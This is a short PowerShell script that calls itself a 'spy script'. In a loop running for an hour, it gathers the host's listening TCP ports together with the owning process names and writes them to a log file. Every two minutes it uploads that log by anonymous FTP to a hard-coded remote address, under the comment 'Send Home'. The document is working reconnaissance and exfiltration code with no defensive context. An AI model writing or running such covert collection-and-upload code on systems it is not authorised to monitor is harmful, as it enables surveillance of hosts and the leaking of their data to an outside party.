#Powershell Spy Script

#Start Site:

$ftp = "ftp://10.254.0.22/portdump/"
$username = "anon"
$password = ""
$localFile = ".\cracklins.log"
$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential($username, $password)

#main loop. script will run every 2 minutes for 1 hour (30 loops):

for ($cnt = 1; $cnt -le 30; $cnt++)

{

#Get Time For FileName:
Get-Date -Second | Out-File -FilePath .\cracklins.log -Append

#Collect Open Ports:
get-nettcpconnection | where {($_.State -eq "Listen") -and ($_.RemoteAddress -eq "0.0.0.0")} | select LocalAddress,LocalPort,RemoteAddress,RemotePort,State,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | ft | Out-File -FilePath .\cracklins.log -Append

#Send Home:
$webclient.UploadFile($ftp, $localFile)

#2 min sleep
Start-Sleep 120

}